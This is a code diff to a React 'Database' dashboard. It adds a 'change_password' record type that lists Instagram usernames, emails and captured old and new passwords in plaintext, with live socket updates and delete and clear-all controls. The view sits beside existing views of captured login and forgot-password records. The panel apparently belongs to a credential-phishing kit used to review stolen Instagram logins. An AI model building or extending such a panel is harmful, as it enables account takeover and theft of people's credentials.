@@ -45,6 +45,23 @@ export default function Database() {
           at: f.at,
           verified: f.verified ?? false,
         }));
+      } else if (type === "change_password") {
+        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/changepassword`);
+        const json = await res.json();
+        console.log('[Database] Change password response:', json);
+        const records = json?.data?.changePasswords ?? [];
+        console.log('[Database] Change password records:', records.length);
+        data = records.map((c) => ({
+          id: c.id,
+          service: c.service || "instagram",
+          username: c.username || "",
+          email: c.email || "",
+          type: "change_password",
+          at: c.at,
+          oldPassword: c.currentPassword,
+          newPassword: c.newPassword,
+        }));
+        console.log('[Database] Mapped change password data:', data);
       } else {
         const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/login`);
         const json = await res.json();
@@ -156,15 +173,61 @@ export default function Database() {
       }
     });
 
+    // ── Change password events ──
+    const mapChangePassword = (c) => ({
+      id: c.id,
+      service: c.service || "instagram",
+      username: c.username || "",
+      email: c.email || "",
+      type: "change_password",
+      at: c.at,
+      oldPassword: c.currentPassword,
+      newPassword: c.newPassword,
+    });
+
+    socket.on("newChangePassword", (doc) => {
+      if (type === "change_password") {
+        setItems((prev) => (prev.some((r) => r.id === doc.id) ? prev : [mapChangePassword(doc), ...prev]));
+      }
+    });
+
+    socket.on("changePasswordDeleted", ({ id }) => {
+      setItems((prev) => prev.filter((r) => r.id !== id));
+      setSelected((prev) => {
+        const n = new Set(prev);
+        n.delete(id);
+        return n;
+      });
+    });
+
+    socket.on("changePasswordsDeleted", ({ ids }) => {
+      const idSet = new Set(ids);
+      setItems((prev) => prev.filter((r) => !idSet.has(r.id)));
+      setSelected((prev) => {
+        const n = new Set(prev);
+        ids.forEach((id) => n.delete(id));
+        return n;
+      });
+    });
+
+    socket.on("changePasswordsCleared", () => {
+      if (type === "change_password") {
+        setItems([]);
+        setSelected(new Set());
+      }
+    });
+
     return () => socket.disconnect();
   }, [type]);
 
   const visible = useMemo(() => {
     let result = items;
+    console.log('[Database] Filtering - type:', type, 'items count:', items.length);
     if (service !== "all") {
       result = result.filter((r) => r.service === service);
     }
     result = result.filter((r) => r.type === type);
+    console.log('[Database] After type filter:', result.length);
     const q = query.trim().toLowerCase();
     if (q) {
       result = result.filter((r) => {
@@ -175,6 +238,7 @@ export default function Database() {
         );
       });
     }
+    console.log('[Database] Final visible:', result.length);
     return result;
   }, [items, service, type, query]);
 
@@ -246,16 +310,28 @@ export default function Database() {
     setDeleting(null);
 
     const isForgot = type === "forgot_password";
+    const isChangePassword = type === "change_password";
+    
     try {
       if (ids.length === 1) {
-        const url = isForgot
-          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/${ids[0]}`
-          : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/${ids[0]}`;
+        let url;
+        if (isForgot) {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/${ids[0]}`;
+        } else if (isChangePassword) {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/changepassword/${ids[0]}`;
+        } else {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/${ids[0]}`;
+        }
         await fetch(url, { method: "DELETE" });
       } else {
-        const url = isForgot
-          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`
-          : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login`;
+        let url;
+        if (isForgot) {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`;
+        } else if (isChangePassword) {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/changepassword`;
+        } else {
+          url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/login`;
+        }
         await fetch(url, {
           method: "DELETE",
           headers: { "Content-Type": "application/json" },
@@ -275,10 +351,17 @@ export default function Database() {
     setClearingAll(false);
 
     const isForgot = type === "forgot_password";
+    const isChangePassword = type === "change_password";
+    
     try {
-      const url = isForgot
-        ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/all`
-        : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/all`;
+      let url;
+      if (isForgot) {
+        url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/all`;
+      } else if (isChangePassword) {
+        url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/changepassword/all`;
+      } else {
+        url = `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/all`;
+      }
       await fetch(url, { method: "DELETE" });
     } catch (err) {
       console.error("Clear all failed:", err);
